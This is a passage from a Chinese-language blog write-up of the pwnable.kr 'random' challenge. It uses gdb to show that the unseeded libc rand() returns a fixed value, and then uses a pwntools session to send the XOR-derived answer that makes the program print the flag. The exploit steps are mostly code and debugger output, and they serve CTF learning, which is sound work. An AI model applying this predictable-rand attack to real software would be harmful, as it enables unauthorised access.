class="string">"/bin/cat flag"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>rand函数是固定种子生成的，不同机器种子不一样。所以这个程序在一台机器上运行每次rand的结果都为固定的一个值。通过调试看这太服务器rand的值是多少。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">(gdb) disass</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</div><div class="line">   0x00000000004005f4 &lt;+0&gt;: push   %rbp</div><div class="line">   0x00000000004005f5 &lt;+1&gt;: mov    %rsp,%rbp</div><div class="line">=&gt; 0x00000000004005f8 &lt;+4&gt;: sub    <span class="variable">$0x10</span>,%rsp</div><div class="line">   0x00000000004005<span class="built_in">fc</span> &lt;+8&gt;: mov    <span class="variable">$0x0</span>,%eax</div><div class="line">   0x0000000000400601 &lt;+13&gt;:    callq  0x400500 &lt;rand@plt&gt;</div><div class="line">   0x0000000000400606 &lt;+18&gt;:    mov    %eax,-0x4(%rbp) </div><div class="line">End of assembler dump.</div><div class="line">(gdb) b *0x0000000000400606</div><div class="line">Breakpoint 2 at 0x400606</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, 0x0000000000400606 <span class="keyword">in</span> main ()</div><div class="line">(gdb) <span class="built_in">print</span> <span class="variable">$eax</span></div><div class="line"><span class="variable">$1</span> = 1804289383</div></pre></td></tr></table></figure>
<p>所以rand固定的值为<em>1804289383</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">random@ubuntu:~$ python</div><div class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24) </div><div class="line">[GCC 5.4.0 20160609] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; from pwn import *</div><div class="line">&gt;&gt;&gt; payload = str(1804289383 ^ 0xdeadbeef)</div><div class="line">&gt;&gt;&gt; io = process(<span class="string">"./random"</span>)</div><div class="line">[x] Starting <span class="built_in">local</span> process <span class="string">'./random'</span></div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./random'</span>: Done</div><div class="line">&gt;&gt;&gt; io.sendline(payload)</div><div class="line">&gt;&gt;&gt; io.recv()</div><div class="line">[*] Process <span class="string">'./random'</span> stopped with <span class="built_in">exit</span> code 0</div><div class="line"><span class="string">'Good!\nMommy, I thought libc random is unpredictable...\n'</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure>

      
    </div>
    <footer>
      
        
          <p style="border-top: #e0e0e0 1px dashed; border-right: #e0e0e0 1px dashed; border-bottom: #e0e0e0 1px dashed; border-left: #e0e0e0 1px dashed; padding-top: 10px;padding-right: 10px;padding-bottom: 10px;padding-left: 110px; background: url(http://i.creativecommons.org/l/by-nc-sa/2.5/cn/88x31.png) #e5f1f4 no-repeat 1% 50%; font-family: 微软雅黑; font-size:11px;" id="PSignature">  
作者：<a href="http://weaponx.site">WeaponX</a>
<br>出处：<a href="http://weaponx.site/2017/02/13/一些pwn题目的解题思路-pwnable-kr/">http://weaponx.site/2017/02/13/一些pwn题目的解题思路-pwnable-kr/</a>           
<br>本文采用<a href="http://creativecommons.org/licenses/by-nc-sa/2.5/cn/" rel="license">知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议</a>进行许可，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接。
</p>

        
        
  
  <div class="categories">
    <a href="/categories/tech/">技术</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/安全/">安全</a>, <a href="/tags/pwn/">pwn</a>
  </div>

        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


<section id="comment">
  
  
  
    <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
    <script src="https://img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
    <script>
    var cloudTieConfig = {
        url: document.location.href, 
        sourceId: "",
        productKey: "0d4cadd44ae547119479fb84d9f5260e",
        target: "cloud-tie-wrapper"
    };
    var yunManualLoad = true;
    Tie.loader("aHR0cHM6Ly9hcGkuZ2VudGllLjE2My5jb20vcGMvbGl2ZXNjcmlwdC5odG1s", true);
    </script>
  
</section>


</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:weaponx.site">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/安全/">安全</a><small>8</small></li>
  
    <li><a href="/categories/tech/">技术</a><small>21</small></li>
  
    <li><a href="/categories/life/">生活</a><small>3</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">标签</h3>
  <ul class="entry">
  
    <li><a href="/tags/ASLR/">ASLR</a><small>1</small></li>
  
    <li><a href="/tags/Django/">Django</a><small>1</small></li>
  
    <li><a href="/tags/Hexo/">Hexo</a><small>4</small></li>
  
    <li><a href="/tags/Linux/">Linux</a><small>1</small></li>
  
    <li><a href="/tags/UAF/">UAF</a><small>2</small></li>
  
    <li><a href="/tags/pwn/">pwn</a><small>13</small></li>
  
    <li><a href="/tags/python/">python</a><small>2</small></li>
  
    <li><a href="/tags/wargame/">wargame</a><small>3</small></li>
  
    <li><a href="/tags/博客/">博客</a><small>4</small></li>
  
    <li><a href="/tags/安全/">安全</a><small>17</small></li>
  
    <li><a href="/tags/影评/">影评</a><small>1</small></li>
  
    <li><a href="/tags/整形溢出/">整形溢出</a><small>1</small></li>
  
    <li><a href="/tags/漏洞/">漏洞</a><small>1</small></li>
  
    <li><a href="/tags/漏洞分析/">漏洞分析</a><small>2</small></li>
  
    <li><a href="/tags/调试/">调试</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">友情链接</h3>
  <ul class="entry">
  
    <li><a href="http://www.cnblogs.com/goabout2/" title="goabout2">goabout2</a></li>
  
    <li><a href="http://rootkiter.com/" title="RootKiter">RootKiter</a></li>
  
    <li><a href="http://reverse-tcp.xyz/" title="Urahara">Urahara</a></li>
  
    <li><a href="https://www.leavesongs.com/" title="phith0n牛的离别歌">phith0n</a></li>
  
  </ul>
</div>



  <div class="widget tag">
  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=270 height=86 src="//music.163.com/outchain/player?type=2&id=427542287&auto=0&height=66"></iframe>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2017 WeaponX
  
</div>
<div class="clearfix"></div></footer>
  <script src="http://apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


</body>
</html>
